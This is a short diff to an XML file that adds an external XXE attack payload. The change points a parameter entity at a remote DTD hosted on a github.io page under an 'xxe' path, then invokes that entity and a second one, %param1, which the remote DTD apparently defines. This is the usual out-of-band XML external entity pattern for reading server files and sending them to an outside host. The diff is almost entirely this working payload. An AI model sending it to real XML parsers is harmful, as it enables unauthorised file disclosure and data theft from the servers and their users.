@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-	<!ENTITY % remote SYSTEM "">
+	<!ENTITY % remote SYSTEM "https://fafnirz.github.io/xxe/hosted/v2/v2.dtd">
 	%remote;
 	%param1;
 ]>
